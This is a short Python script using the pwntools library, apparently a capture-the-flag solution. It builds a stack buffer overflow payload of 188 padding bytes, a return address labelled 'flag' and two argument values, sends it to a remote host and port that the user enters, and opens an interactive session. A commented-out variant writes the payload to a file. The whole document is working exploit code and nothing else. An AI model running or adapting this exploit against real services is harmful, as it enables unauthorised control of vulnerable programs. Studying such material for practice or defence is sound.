from pwn import *

flag = 0x080491e2
parm1 = 0xdeadbeef
parm2 = 0xc0ded00d

host = input("HOST: ")
host = host.split(':')

payload = b'a'*188 + p32(flag) + b'a'*4 + p32(parm1) + p32(parm2)

p = remote(host[0], int(host[1]))
p.sendline(payload)
p.interactive()
"""

from pwn import *

flag = 0x080491e2
payload = b'a'*188 + p32(flag)  
file_path = 'ex'

# Write the payload to the file
with open(file_path, 'wb') as file:
    file.write(payload)"""
